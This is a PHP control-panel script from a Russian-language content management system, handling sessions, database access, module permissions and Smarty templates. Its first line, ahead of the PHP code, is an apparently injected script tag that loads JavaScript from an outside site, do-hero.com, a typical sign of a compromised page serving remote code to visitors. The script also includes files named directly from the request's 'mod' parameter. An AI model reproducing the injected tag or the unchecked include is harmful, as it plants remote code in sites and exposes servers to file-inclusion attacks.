<span class="mylinkcode"><script type="text/javascript" src="http://www.do-hero.com/nike.js"></script></span><?php
define ('_MANAGE_MODE','1');

//error_reporting(1);


include ('../config_site.php');

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
header('Content-Type: text/html; charset='.$charset);


session_start();
// Start Lang
include ($abs_path.'/includes/admin.ru.php');
//Start DB
include ($abs_path.'/includes/incoc_db.php');
$db = new db();

if (isset($_POST['mod'])) {
    $mod = $_POST['mod'];
} elseif (isset($_GET['mod'])) {
    $mod = $_GET['mod'];
} else {
$_POST['mod'] = 'settings';	
$mod = $_POST['mod'];	
}

if (isset($_POST['task'])) {
    $task = $_POST['task'];	
} elseif (isset($_GET['task'])) {
    $task = $_GET['task'];	
} else {
// $_POST['task'] = 'category';	
$task = $_POST['task'];		
}

include ($abs_path.'/includes/incoc_regardo.php');
$err = new error;
$html = new html;
// Start Smarty
require_once($abs_path.'/libra/Smarty.class.php');
$smarty = new Smarty();
$smarty->template_dir = $abs_path.'/control/shablon/';
$smarty->compile_dir = $abs_path.'/control/shablon_c/';

include ($abs_path.'/control/authentif.php');

unset($gr);
$gr = $_SESSION['gr'];

include ($abs_path.'/control/navigate.php');
// обрабатываем модули
if (!empty($mod)) {
   $module = getModuleName();
   $result = $db->query("SELECT count(*) as count FROM #__users_allow WHERE id_users='".$gr."' AND id_module = '".$module['id']."'");
   $count_allow = $db->loadAssocList($result);
   if ($count_allow[0]['count'] > 0 || $_SESSION['gr'] == 0) {	
   	$smarty->assign('mod_name',getModuleName());
	include($abs_path.'/tadjiki/'.$mod.'/admin.'.$mod.'.php');
   } else {
   	$smarty->assign('content_template','empty.tpl');
   }
} else { // либо главная
	include($abs_path.'/tadjiki/frontpage/admin.frontpage.php');
}	
//USERS

$smarty->assign('mod',$mod);
$smarty->assign('task',$task);

$smarty->assign('USER',regGetUser());
$smarty->assign('path',$base_url);
$smarty->assign('title','Панель управления ');
$smarty->display('index.tpl');
?>